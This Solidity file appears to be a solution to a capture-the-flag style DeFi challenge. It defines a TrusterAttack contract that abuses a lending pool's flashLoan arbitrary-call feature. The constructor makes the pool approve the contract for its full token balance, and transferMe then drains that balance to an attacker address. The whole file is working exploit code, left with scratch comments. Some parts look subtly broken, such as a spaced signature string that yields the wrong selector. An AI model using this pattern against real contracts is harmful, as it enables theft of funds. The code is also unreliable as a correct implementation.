pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
        ) external;
}

contract TrusterAttack {
    using Address for address;

    address public pool;
    IERC20 public token;
    address public attacker;
    uint256 public balance;

    constructor(address poolAddress,
                address tokenAddress,
                address attackerAddress
               ) 
    {
        //Idea
        pool = poolAddress;
        token = IERC20(tokenAddress);
        attacker = attackerAddress;
        balance = token.balanceOf(pool);


        uint256 transferAmount = 1;
        IPoolFunc(pool).flashLoan(
            1,
            address(this),
            tokenAddress,
            abi.encodeWithSignature(
                "approve(address, uint256)",
                address(this),
                balance
            )
        );
        //token.transfer(pool, transferAmount);
        //IERC20(tokenAddress).transfer(attackerAddress, balance);
        //calldata = approve(pool, this)
        //response 
        //token.tranfser(amount,attacker)
        //
    }
    function transferMe() public{
        token.transferFrom(pool, attacker, balance);
    }

   
}